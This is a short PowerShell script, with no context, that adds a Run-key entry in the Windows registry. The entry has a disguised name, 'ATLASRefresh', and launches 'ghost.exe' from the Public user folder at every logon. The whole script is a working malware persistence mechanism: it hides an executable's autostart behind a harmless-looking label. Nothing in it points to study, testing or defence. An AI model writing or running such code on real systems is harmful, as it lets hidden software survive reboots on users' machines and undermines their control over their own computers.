
$name = "ATLASRefresh"
$run = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$exe = "C:\Users\Public\ghost.exe"
if (!(Test-Path $run)) { New-Item -Path $run -Force | Out-Null }
Set-ItemProperty -Path $run -Name $name -Value $exe
